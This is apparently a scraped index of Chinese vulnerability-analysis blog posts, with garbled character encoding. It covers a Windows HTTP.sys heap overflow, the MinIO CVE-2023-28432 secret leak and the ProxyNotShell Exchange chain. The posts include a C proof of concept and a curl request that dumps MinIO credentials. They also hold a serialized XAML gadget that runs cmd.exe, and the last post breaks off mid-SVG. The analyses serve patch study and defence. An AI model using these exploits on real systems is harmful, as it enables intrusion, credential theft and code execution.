urlGroupId = HTTP_NULL_ID; // åˆå§‹åŒ–HTTPæœåŠ¡å™¨é©±åŠ¨ retCode = HttpInitialize(HttpApiVersion, HTTP_INITIALIZE_SERVER, // Flags NULL // Reserved ); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpInitialize failed with %lu \\n\u0026#34;, retCode); return retCode; } // åˆ›å»ºæœåŠ¡ä¼šè¯ retCode = HttpCreateServerSession(HttpApiVersion, \u0026amp;ssID, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateServerSession failed with %lu \\n\u0026#34;, retCode); return 0; } // åˆ›å»ºurl group retCode = HttpCreateUrlGroup(ssID, \u0026amp;urlGroupId, 0); if (retCode != NO_ERROR) { wprintf(L\u0026#34;HttpCreateUrlGroup failed with %lu \\n\u0026#34;, retCode); return 0; } BYTE data_temp1[0x1000] = {0}; DWORD return_len = 0; // åˆ†é… 0xfffffe0 å¤§å°çš„å †å— WCHAR *str = HeapAlloc(GetProcessHeap(), 0, 0xfffffe0); WCHAR str_test[0xfffe] = L\u0026#34;192.168.52.133:8081\u0026#34;; memcpy(str, str_test, 0x20); HTTP_CHANNEL_BIND_INFO bind_info; bind_info.Hardening = HttpAuthenticationHardeningLegacy; bind_info.Flags = HTTP_CHANNEL_BIND_PROXY; HTTP_SERVICE_BINDING_W service_binding; HTTP_SERVICE_BINDING_BASE binding_base; binding_base.Type = HttpServiceBindingTypeW; service_binding.Base = binding_base; service_binding.Buffer = str; service_binding.BufferSize = 0xfffffe0 - 0xf0f0f0; // F0F0EF0 PHTTP_SERVICE_BINDING_BASE binding_base_arr[0x11]; PHTTP_SERVICE_BINDING_BASE tmp_binding_base = \u0026amp;service_binding; for (int i = 0; i \u0026lt; 0x11; i++) { binding_base_arr[i] = tmp_binding_base; } bind_info.ServiceNames = binding_base_arr; bind_info.NumberOfServiceNames = 0x11; retCode = HttpSetUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;bind_info, 0x20); retCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); } åœ¨http!UlCopyChannelBindConfigToIrp ä¸‹æ–­ç‚¹ï¼Œè¿è¡ŒPoCï¼Œæ­¤æ—¶è°ƒç”¨æ ˆä¸º\n1: kd\u0026gt; k # Child-SP RetAddr Call Site 00 fffff889`cd7f76a8 fffff805`7981ae19 HTTP!UlCopyChannelBindConfigToIrp 01 fffff889`cd7f76b0 fffff805`7982caf5 HTTP!UlQueryConfigGroupProperty+0x175 02 fffff889`cd7f7740 fffff805`797130aa HTTP!UlQueryUrlGroupIoctl+0x195 03 fffff889`cd7f77c0 fffff805`6dc954d5 HTTP!UxDeviceControl+0x8a 04 fffff889`cd7f7800 fffff805`6e0a6048 nt!IofCallDriver+0x55 05 fffff889`cd7f7840 fffff805`6e0a5e47 nt!IopSynchronousServiceTail+0x1a8 06 fffff889`cd7f78e0 fffff805`6e0a51c6 nt!IopXxxControlFile+0xc67 07 fffff889`cd7f7a20 fffff805`6de0d8f5 nt!NtDeviceIoControlFile+0x56 08 fffff889`cd7f7a90 00007ff9`c610d1a4 nt!KiSystemServiceCopyEnd+0x25 09 00000014`7dcd6308 00007ff9`b6391b7a ntdll!NtDeviceIoControlFile+0x14 0a 00000014`7dcd6310 00007ff9`b6393c9f HTTPAPI!HttpApiSynchronousDeviceControl+0x8a 0b 00000014`7dcd6390 00007ff6`93fb18b2 HTTPAPI!HttpQueryUrlGroupProperty+0x6f 0c 00000014`7dcd6410 00000000`00000000 http_poc2!wmain+0x3d2 [D:\\code\\c\\http_poc2.c @ 113] http!UlCopyChannelBindConfigToIrp ä¼ªä»£ç å¦‚ä¸‹ï¼Œè¯¥å‡½æ•°è°ƒç”¨UxGetOutputBufferForOutDirect è®¡ç®—å­˜å‚¨ChannelBindConfig æ‰€éœ€çš„å†…å­˜å¤§å°ï¼Œå¹¶å’ŒUxGetOutputBufferForOutDirectè¿”å›çš„åˆ†é…çš„å†…å­˜å¤§å°ä½œæ¯”è¾ƒï¼š\n__int64 __fastcall UlCopyChannelBindConfigToIrp(__int64 a1, IRP *a2, unsigned int *a3) { ... v8 = UlpComputeChannelBindConfigSize(a1, a2); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 16, 4, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } v11 = v31; if ( (*(_DWORD *)a1 \u0026amp; 1) == 0 ) { *(_QWORD *)v31 = 0i64; *(_QWORD *)(v11 + 8) = 0i64; goto LABEL_32; } *(_DWORD *)(v31 + 4) = *(_DWORD *)(a1 + 8); *(_DWORD *)v11 = *(_DWORD *)(a1 + 4); *(_QWORD *)(v11 + 8) = 0i64; v12 = *(_QWORD *)(a1 + 16); if ( !v12 || !*(_DWORD *)(v12 + 16) ) goto LABEL_32; v13 = (v11 + 19) \u0026amp; 0xFFFFFFFFFFFFFFFCui64; v38 = v13; v36 = (_DWORD *)v13; *(_DWORD *)(v11 + 8) = v13 + v32 - v31; *(_DWORD *)(v11 + 12) = *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); v14 = *(unsigned int *)(*(_QWORD *)(a1 + 16) + 16i64); v15 = (_DWORD *)(v13 + 4 * v14); v37 = v15; v16 = (char *)\u0026amp;v15[3 * v14]; v35 = v16; v17 = 0; v34 = 0; while ( v17 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_DWORD *)(v13 + 4i64 * v17) = (_DWORD)v15 + v32 - v31; v18 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v17); if ( *(_DWORD *)v18 == 2 ) { v36 = v15 + 3; v37 = v15 + 3; *v15 = 2; v15[1] = (_DWORD)v16 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v16, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v35[*(unsigned int *)(v18 + 16)]; } else { v36 = v15 + 3; v37 = v15 + 3; *v15 = 1; v30 = (char *)((unsigned __int64)(v16 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); v15[1] = (_DWORD)v30 + v32 - v31; v15[2] = *(_DWORD *)(v18 + 16); memmove(v30, *(const void **)(v18 + 8), *(unsigned int *)(v18 + 16)); v16 = \u0026amp;v30[*(unsigned int *)(v18 + 16)]; } v35 = v16; v34 = ++v17; v15 = v36; v13 = v38; } LABEL_31: v3 = v42; goto LABEL_32; } v38 = 0i64; v19 = IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (_DWORD)a2, (_DWORD)CurrentStackLocation, 24, v19 != 0 ? 4 : 8, (__int64)\u0026amp;v31, (__int64)\u0026amp;v32, (__int64)\u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) == 0 ) goto LABEL_32; v10 = 44i64; goto LABEL_6; } if ( v21 \u0026amp;\u0026amp; *(_DWORD *)(v21 + 16) ) { ... while ( v26 \u0026lt; *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { *(_QWORD *)(v22 + 8i64 * v26) = v32 + (unsigned int)(v24 - v31); v27 = *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(a1 + 16) + 8i64) + 8i64 * v26); if ( *(_DWORD *)v27 == 2 ) { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 2; *(_QWORD *)(v24 + 8) = v32 + (unsigned int)((_DWORD)v25 - v31); *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v25, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16)); v25 = \u0026amp;v35[*(unsigned int *)(v27 + 16)]; } else { v36 = (_DWORD *)(v24 + 24); v37 = (_DWORD *)(v24 + 24); *(_DWORD *)v24 = 1; v28 = (char *)((unsigned __int64)(v25 + 1) \u0026amp; 0xFFFFFFFFFFFFFFFEui64); *(_QWORD *)(v24 + 8) = v32 + (((_DWORD)v25 + 1) \u0026amp; 0xFFFFFFFE) - (unsigned int)v31; *(_DWORD *)(v24 + 16) = *(_DWORD *)(v27 + 16); memmove(v28, *(const void **)(v27 + 8), *(unsigned int *)(v27 + 16));// è§¦å‘æ¼æ´ v25 = \u0026amp;v28[*(unsigned int *)(v27 + 16)]; } v35 = v25; v34 = ++v26; v24 = (__int64)v36; v22 = v39; } goto LABEL_31; } LABEL_32: if ( (int)(OutputBufferForOutDirect + 0x80000000) \u0026lt; 0 || OutputBufferForOutDirect == -2147483643 ) v6 = v8; *v3 = v6; return (unsigned int)OutputBufferForOutDirect; } åœ¨UlpComputeChannelBindConfigSizeå‡½æ•°ä¸­å­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œè¯¥å‡½æ•°ä¼ªä»£ç å¦‚ä¸‹ï¼Œrsi+10hå¤„æŒ‡å‘äº†ç”¨æˆ·ä¼ å…¥çš„HTTP_CHANNEL_BIND_INFOç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š\ntypedef struct _HTTP_CHANNEL_BIND_INFO { HTTP_AUTHENTICATION_HARDENING_LEVELS Hardening; ULONG Flags; PHTTP_SERVICE_BINDING_BASE * ServiceNames; ULONG NumberOfServiceNames; } HTTP_CHANNEL_BIND_INFO, *PHTTP_CHANNEL_BIND_INFO; typedef enum _HTTP_AUTHENTICATION_HARDENING_LEVELS { HttpAuthenticationHardeningLegacy = 0, HttpAuthenticationHardeningMedium, HttpAuthenticationHardeningStrict } HTTP_AUTHENTICATION_HARDENING_LEVELS; typedef struct _HTTP_SERVICE_BINDING_BASE { HTTP_SERVICE_BINDING_TYPE Type; } HTTP_SERVICE_BINDING_BASE, *PHTTP_SERVICE_BINDING_BASE; typedef struct _HTTP_SERVICE_BINDING_A { HTTP_SERVICE_BINDING_BASE Base; PCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_A, *PHTTP_SERVICE_BINDING_A; typedef struct _HTTP_SERVICE_BINDING_W { HTTP_SERVICE_BINDING_BASE Base; PWCHAR Buffer; ULONG BufferSize; } HTTP_SERVICE_BINDING_W, *PHTTP_SERVICE_BINDING_W; __int64 __fastcall UlpComputeChannelBindConfigSize(__int64 a1, IRP *a2) { unsigned int v4; // ebx __int64 v5; // rax __int64 v6; // rdi __int64 v7; // r9 _DWORD *v8; // r8 v4 = IoIs32bitProcess(a2) != 0 ? 16 : 24; if ( (*(_DWORD *)a1 \u0026amp; 1) != 0 ) { v5 = *(_QWORD *)(a1 + 16); if ( v5 ) { if ( *(_DWORD *)(v5 + 16) ) { v6 = 0i64; v4 += (IoIs32bitProcess(a2) != 0 ? 16 : 32) * *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64); if ( *(_DWORD *)(*(_QWORD *)(a1 + 16) + 16i64) ) { do { IoIs32bitProcess(a2); v7 = *(_QWORD *)(a1 + 16); // HTTP_CHANNEL_BIND_INFO ç»“æ„ä½“ v8 = *(_DWORD **)(*(_QWORD *)(v7 + 8) + 8 * v6);// ServiceName ç»“æ„ä½“ if ( *v8 == 1 ) // å¦‚æœæ˜¯HttpServiceBindingTypeW åˆ™è¿›å…¥ v4 = (v4 + 1) \u0026amp; 0xFFFFFFFE; v4 += v8[4]; // V8æ˜¯enum HTTP_SERVICE_BINDING_BASEç±»å‹ï¼Œå 4ä¸ªå­—èŠ‚ï¼Œåˆ™V8[4]å°±æ˜¯V8 åé¢16ä¸ªå­—èŠ‚ï¼Œå³BufferSize v6 = (unsigned int)(v6 + 1); } while ( (unsigned int)v6 \u0026lt; *(_DWORD *)(v7 + 16) ); } } } } return v4; } è¯¥å‡½æ•°éå†HTTP_CHANNEL_BIND_INFOç»“æ„ä½“çš„ServiceNames HTTP_SERVICE_BINDING_WæŒ‡é’ˆæ•°ç»„çš„BufferSizeï¼Œå¹¶ç›¸åŠ ï¼Œè€Œåå°†å…¶è¿”å›ï¼Œå…¶ä¸­v4ä¸ºunsigned intç±»å‹ï¼Œè€ŒBufferSizeä¸ºULONGç±»å‹ï¼Œå‡ä¸ºå››ä¸ªå­—èŠ‚ï¼Œå½“å¾ªç¯ç›¸åŠ æ—¶ï¼Œå¦‚æœBufferSize * NumberOfServiceNames å’Œv4ç›¸åŠ è¶…å‡º0xFFFFFFFFåˆ™ä¼šäº§ç”Ÿæ•´æ•°æº¢å‡ºï¼Œä½¿å¾—UlpComputeChannelBindConfigSizeè¿”å›çš„å†…å­˜å¤§å°å°äºå®é™…æ‰€éœ€çš„å†…å­˜å¤§å°ã€‚åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°åœ¨æ‰§è¡Œå®Œfffff805`7984c899 03d9 add ebx, ecxåï¼Œå°†äº§ç”Ÿæº¢å‡ºï¼Œebxå˜ä¸º0x28ã€‚\nè¿”å›åˆ°ä¸Šå±‚å‡½æ•°ï¼ŒUlCopyChannelBindConfigToIrp è°ƒç”¨UxGetOutputBufferForOutDirectè·å–åˆ°ç”¨æˆ·ä¼ å…¥çš„ç¼“å†²åŒºå¤§å°ï¼Œæ­¤æ—¶v41å€¼ä¸º0x140\nretCode = HttpQueryUrlGroupProperty(urlGroupId, HttpServerChannelBindProperty, \u0026amp;data_temp1, 0x140, \u0026amp;return_len); v43 = v8; if ( IoIs32bitProcess(a2) ) { v36 = 0i64; IoIs32bitProcess(a2); OutputBufferForOutDirect = UxGetOutputBufferForOutDirect( (__int64)a2, (__int64)CurrentStackLocation, 0x10u, 4i64, \u0026amp;v31, \u0026amp;v32, \u0026amp;v41); v33 = OutputBufferForOutDirect; if ( OutputBufferForOutDirect \u0026lt; 0 ) goto LABEL_32; if ( v8 \u0026gt; v41 ) { OutputBufferForOutDirect = -2147483643; v33 = -2147483643; if ( (WPP_MAIN_CB.StackSize \u0026amp; 0x20) != 0 ) { v10 = 43i64; LABEL_6: WPP_SF_D(v10, \u0026amp;WPP_64a86ec3d91e339ac994f13222c31d64_Traceguids, 2147483653i64); goto LABEL_32; } goto LABEL_32; } ç”±äºåœ¨HTTP!UlpComputeChannelBindConfigSizeä¸­å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå¯¼è‡´HTTP!UlpComputeChannelBindConfigSizeè¿”å›å€¼å°äºç”¨æˆ·æä¾›çš„0x140ï¼Œç»•è¿‡äº†å†…å­˜å¤§å°æ£€æŸ¥ï¼Œåœ¨åé¢é€šè¿‡memcpyå°†HTTP_CHANNEL_BIND_INFOç»“æ„ä½“çš„PHTTP_SERVICE_BINDING_BASEçš„Bufferæˆå‘˜æ‹·è´åˆ°æŒ‡å®šå†…å­˜ä¸­ï¼Œæ‹·è´é•¿åº¦ä¸ºBufferSizeï¼Œå³ç”¨æˆ·æä¾›çš„0xF0F0EF0\n0xF0F0EF0è¿œå¤§äºç”¨æˆ·è¾“å…¥çš„ç¼“å†²åŒº0x1000ï¼Œå¯¼è‡´å †æº¢å‡ºã€‚\nè¡¥ä¸ é€šè¿‡bindiffå¯çŸ¥ï¼Œåœ¨è¡¥ä¸ä¸­å¢åŠ äº†å¯¹BufferSizeè¿›è¡Œåˆ¤æ–­çš„é€»è¾‘ï¼Œåˆ¤æ–­BufferSizeæ˜¯å¦å°äº0xFFFC\nç”±äºServiceNameæœ€å¤§æ•°é‡é™åˆ¶ä¸º0x40ï¼Œåˆ™0x40 * 0xFFFC = 3FFF00ï¼Œä¸èƒ½äº§ç”Ÿæº¢å‡ºï¼Œä¿®å¤äº†è¯¥æ¼æ´ã€‚\nå‚è€ƒèµ„æ–™\nhttps://www.freebuf.com/vuls/364920.html\nCreated at 2023-05-05T20:59:45+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/","title":"CVE-2023-28432 MinIO ä¿¡æ¯æ³„éœ²æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ Minioæ˜¯ä¸€ä¸ªå¤šäº‘å¯¹è±¡å­˜å‚¨æ¡†æ¶ã€‚åœ¨ä» RELEASE.2019-12-17T23-16-33Z å¼€å§‹ä¸” RELEASE.2023-03-20T20-16-18Z ä¹‹å‰çš„é›†ç¾¤éƒ¨ç½²ä¸­ï¼ŒMinIO è¿”å›æ‰€æœ‰ç¯å¢ƒå˜é‡ï¼ŒåŒ…æ‹¬â€œMINIO_SECRET_KEYâ€å’Œâ€œMINIO_ROOT_PASSWORDâ€ï¼Œä»è€Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ã€‚åˆ†å¸ƒå¼éƒ¨ç½²çš„æ‰€æœ‰ç”¨æˆ·éƒ½ä¼šå—åˆ°å½±å“ã€‚å»ºè®®æ‰€æœ‰ç”¨æˆ·å‡çº§åˆ°å‘å¸ƒç‰ˆæœ¬.2023-03-20T20-16-18Zã€‚\næŒ‡çº¹ web.title=\u0026ldquo;minio\u0026rdquo;\nå½±å“ç‰ˆæœ¬ 2019-12-17t23-16-33z \u0026lt;= Minio \u0026lt; 2023-03-20t20-16-18z\nç¯å¢ƒæ­å»º ä½¿ç”¨Dockerå¯åŠ¨4ä¸ªminioå³å¯ã€‚\næŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸åˆ†æ å¯¹æ¯”ä¿®å¤ç‰ˆæœ¬å’Œæœªä¿®å¤ç‰ˆæœ¬ https://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Zå¯çŸ¥æ¼æ´åœ¨commit https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077ä¿®å¤ï¼ŒæŸ¥çœ‹ä¿®å¤ä»£ç ï¼Œå¯ä»¥çŸ¥é“åœ¨ cmd/bootstrap-peer-server.go#VerifyHandleræ–¹æ³•ä¸­å¢åŠ äº†é‰´æƒé€»è¾‘ï¼š func storageServerRequestValidate(r *http.Request) error { token, err := jwtreq.AuthorizationHeaderExtractor.ExtractToken(r) if err != nil { if err == jwtreq.ErrNoTokenInRequest { return errNoAuthToken } return errMalformedAuth } claims := xjwt.NewStandardClaims() if err = xjwt.ParseWithStandardClaims(token, claims, []byte(globalActiveCred.SecretKey)); err != nil { return errAuthentication } owner := claims.AccessKey == globalActiveCred.AccessKey || claims.Subject == globalActiveCred.AccessKey if !owner { return errAuthentication } if claims.Audience != r.URL.RawQuery { return errAuthentication } requestTimeStr := r.Header.Get(\u0026#34;X-Minio-Time\u0026#34;) requestTime, err := time.Parse(time.RFC3339, requestTimeStr) if err != nil { return errMalformedAuth } utcNow := UTCNow() delta := requestTime.Sub(utcNow) if delta \u0026lt; 0 { delta *= -1 } if delta \u0026gt; DefaultSkewTime { return errSkewedAuthTime } return nil } è€Œ VerifyHandleræ–¹æ³•å¯¹åº”çš„è·¯ç”±åœ¨cmd/bootstrap-peer-server.go#registerBootstrapRESTHandlersæ³¨å†Œï¼Œå¯¹åº”çš„è·¯å¾„ä¸º bootstrapRESTPrefix+bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify\nfunc registerBootstrapRESTHandlers(router *mux.Router) { h := func(f http.HandlerFunc) http.HandlerFunc { return collectInternodeStats(httpTraceHdrs(f)) } server := \u0026amp;bootstrapRESTServer{} subrouter := router.PathPrefix(bootstrapRESTPrefix).Subrouter() subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodHealth).HandlerFunc( h(server.HealthHandler)) subrouter.Methods(http.MethodPost).Path(bootstrapRESTVersionPrefix + bootstrapRESTMethodVerify).HandlerFunc( h(server.VerifyHandler)) } minioReservedBucket = \u0026#34;minio\u0026#34; minioReservedBucketPath = SlashSeparator + minioReservedBucket bootstrapRESTPrefix = minioReservedBucketPath + \u0026#34;/bootstrap\u0026#34; const ( bootstrapRESTVersion = \u0026#34;v1\u0026#34; bootstrapRESTVersionPrefix = SlashSeparator + bootstrapRESTVersion ) const ( bootstrapRESTMethodVerify = \u0026#34;/verify\u0026#34; ) ç»¼åˆå¯å¾—ï¼Œè§¦å‘æ¼æ´æ–¹æ³•ä¸ºå‘/minio/bootstrap/v1/verifyæ¥å£å‘é€POSTè¯·æ±‚å³å¯ï¼Œé™¤äº†å¯¹verifyæ¥å£åšé‰´æƒä¹‹å¤–ï¼Œè¡¥ä¸ä¸­è¿˜åœ¨è¾“å‡ºä¸­å»é™¤äº†å¯†é’¥ç­‰æ•æ„Ÿä¿¡æ¯ã€‚ ![[../images/Pasted image 20231007234853.png]]\nPoC\ncurl -X POST http://target/minio/bootstrap/v1/verify å°ç»“ è¿™ä¸ªæ¼æ´åˆ†æèµ·æ¥è¾ƒä¸ºç®€å•ï¼Œç”±äºMinioæ˜¯goå¼€å‘çš„ï¼Œç›´æ¥RCEæ¯”è¾ƒéš¾ï¼Œç›®å‰RCEæ–¹å¼æ˜¯é€šè¿‡ä¿¡æ¯æ³„éœ²è·å–åˆ°ç®¡ç†å‘˜å¯†é’¥ç™»å½•ï¼Œè€Œåæ›¿æ¢æ›´æ–°é“¾æ¥ï¼Œåœ¨ä½¿ç”¨minioè‡ªå¸¦çš„mcå·¥å…·è¿›è¡Œæ›´æ–°ï¼Œå°†å½“å‰minioå®ä¾‹æ›¿æ¢ä¸ºå¸¦æœ‰åé—¨ç‰ˆæœ¬çš„minioï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚\nå‚è€ƒé“¾æ¥\nhttps://github.com/minio/minio/compare/RELEASE.2023-03-13T19-46-17Z\u0026hellip;RELEASE.2023-03-20T20-16-18Z\nåˆ›å»ºäº2023-10-06\nCreated at 2023-05-05T20:53:41+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/proxy-not-shell/","title":"Proxy Not Shell åˆ©ç”¨é“¾åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"æ¼æ´ç¯å¢ƒ Windows Server 2019 Windows Exchange 2019 CU9 æ¼æ´åˆ†æ æ¼æ´é“¾åŒ…å«äº†ä¸¤ä¸ªæ¼æ´ï¼š\nCVE-2022-41040 Exchange æƒé™æå‡æ¼æ´ CVE-2022-41082 Exchange è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ CVE-2022-41040 æ˜¯ProxyShellä¿®å¤ä¸å®Œå…¨çš„äº§ç‰©ï¼Œåœ¨ProxyShellåˆ©ç”¨é“¾ä¸­æ— éœ€èº«ä»½éªŒè¯å°±å¯ä»¥é€šè¿‡autodiscover.jsonè¯·æ±‚åˆ°/PowerShellæ¥å£ï¼Œåœ¨CVE-2022-41040 ä¸­ï¼Œä»…éœ€è¦ä½æƒé™èº«ä»½éªŒè¯å°±å¯ä»¥è¯·æ±‚åˆ°è¯¥æ¥å£ï¼Œé€šè¿‡SSRFå°†ä½æƒé™è½¬æ¢ä¸ºé«˜æƒé™ã€‚\nCVE-2022-41082æ˜¯Exchangeçš„ååºåˆ—åŒ–æ¼æ´ï¼Œé€šè¿‡ä¼ å…¥æ¶æ„åºåˆ—åŒ–æ•°æ®ï¼Œä½¿å¾—Exchangeè§¦å‘èƒ½å¤Ÿé€ æˆä»£ç æ‰§è¡Œçš„ååºåˆ—åŒ–è¿‡ç¨‹ï¼Œå°†æŒ‡å®šæ•°æ®ååºåˆ—åŒ–åˆ°æ¶æ„ç±»ï¼Œä»è€Œåœ¨ExchangeæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚\nåœ¨PoCä¸­å‘é€äº†ä»¥ä¸‹ä¸‰ç§ç±»å‹çš„PSRPæ¶ˆæ¯\n0x00010002 SESSION_CAPABILITY\nSESSION_CAPABILITY åº”è¯¥æ˜¯åˆ›å»ºRunspacePool\n0x00010004 INIT_RUNSPACEPOOL\nINIT_RUNSPACEPOOL åº”è¯¥æ˜¯åˆå§‹åŒ–RunspacePool\n0x00021006 CREATE_PIPELINE\nåˆ›å»ºå‘½ä»¤ç®¡é“å¹¶åœ¨æŒ‡å®šçš„ RunspacePool ä¸­è°ƒç”¨å®ƒ\nPoCé€šè¿‡PSRPåè®®åˆ›å»ºäº†è¿œç¨‹PowerShellç®¡é“ï¼Œå¹¶è¯•å›¾åœ¨è¿™ä¸ªç®¡é“å†…æ‰§è¡ŒNew-OfflineAddressBookè¿™ä¸ªcmdletï¼Œå¹¶å°†å¯¹åº”çš„åºåˆ—åŒ–æ•°æ®ä¼ ç»™äº†Exchangeã€‚\nPoCä¸»è¦ç»„æˆéƒ¨åˆ†å¦‚ä¸‹æ‰€ç¤ºï¼ŒBAæ ‡ç­¾å†…æ˜¯base64ç¼–ç çš„åºåˆ—åŒ–System.UnitySerializationHolderå¯¹è±¡\n\u0026lt;Obj N=\u0026#34;V\u0026#34; RefId=\u0026#34;14\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;Name\u0026#34;\u0026gt;Type\u0026lt;/S\u0026gt; \u0026lt;Obj N=\u0026#34;TargetTypeForDeserialization\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;2\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Exception\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;MS\u0026gt; \u0026lt;BA N=\u0026#34;SerializationData\u0026#34;\u0026gt;AAEAAAD/////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=\u0026lt;/BA\u0026gt; \u0026lt;/MS\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;S\u0026gt; \u0026lt;![CDATA[\u0026lt;ResourceDictionary xmlns=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation\u0026#34; xmlns:x=\u0026#34;http://schemas.microsoft.com/winfx/2006/xaml\u0026#34; xmlns:System=\u0026#34;clr-namespace:System;assembly=mscorlib\u0026#34; xmlns:Diag=\u0026#34;clr-namespace:System.Diagnostics;assembly=system\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider x:Key=\u0026#34;LaunchCalch\u0026#34; ObjectType=\u0026#34;{x:Type Diag:Process}\u0026#34; MethodName=\u0026#34;Start\u0026#34;\u0026gt;\u0026lt;ObjectDataProvider.MethodParameters\u0026gt;\u0026lt;System:String\u0026gt;cmd.exe\u0026lt;/System:String\u0026gt;\u0026lt;System:String\u0026gt;/c whoami\u0026gt; c:\\users\\public\\1.txt\u0026lt;/System:String\u0026gt; \u0026lt;/ObjectDataProvider.MethodParameters\u0026gt; \u0026lt;/ObjectDataProvider\u0026gt; \u0026lt;/ResourceDictionary\u0026gt;]]\u0026gt; \u0026lt;/S\u0026gt; \u0026lt;/Obj\u0026gt; XamlReader.Parse() BAæ ‡ç­¾æ•°æ® .....Ã¿Ã¿Ã¿Ã¿..............System.UnitySerializationHolder..... Data\tUnityType.AssemblyName......... System.Windows.Markup.XamlReader......... XPresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35. PoCéƒ¨åˆ†ç”±ä¸¤ä¸ªå¯¹è±¡åµŒå¥—è€Œæˆï¼Œå¤§è‡´ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š\nObj V(System.ServiceProcess.ServiceController): String Name=\u0026#34;Type\u0026#34; Obj TargetTypeForDeserialization(System.Exception): ByteArray SerializationData String SerializationData ä»£ç é€»è¾‘\nä»£ç é€»è¾‘å¦‚ä¸‹å›¾\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\r\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\rèƒŒæ™¯ 1\rCenter Gradient\ré¡µ-1\ræµç¨‹\rReadOneObject\rReadOneObject\tæµç¨‹.8\rReadOneDeserializedObject éå†XMLæ ‘çš„æ 